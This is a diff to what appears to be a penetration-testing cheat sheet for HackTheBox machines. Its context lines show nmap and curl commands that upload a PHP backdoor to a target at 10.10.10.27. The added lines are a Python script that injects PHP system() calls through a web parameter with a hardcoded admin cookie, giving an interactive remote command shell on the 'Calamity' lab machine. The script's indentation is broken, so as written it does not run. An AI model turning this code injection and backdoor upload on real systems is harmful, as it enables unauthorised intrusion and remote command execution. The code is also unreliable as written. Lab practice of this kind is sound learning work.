@@ -76,9 +76,27 @@ Spoilers
     https://sploitfun.wordpress.com/
     https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/
 
-    
+
 Shell file upload
   nmap -p 80 --script http-put --script-args http-put.url='/admin.php/backdoor.php',http-put.file='backdoor.php' 10.10.10.27 -v
 
   curl --upload-file test.txt -v --url http://target/test/test.txt
     OR you can also do: curl -X PUT -d
+
+<h2>Shell for calamity</h2>
+  # Hackthebox Calamity shell to interact with the machine 10.10.10.27 / by ihebski / Sold1er
+
+  import requests
+  cookies = dict(adminpowa='noonecares')
+
+  def shell(cmd):
+  r = requests.get('http://10.10.10.27/admin.php?html=<?php system("'+cmd+'"); ?>', cookies=cookies)
+  html = r.text
+  print html[html.find("</html>")+7:]
+
+
+  if __name__ == '__main__':
+  print "[+] connected to 10.10.10.27 ..."
+  while True:
+    cmd = raw_input("\033[92mbash $ ")
+  shell(cmd)
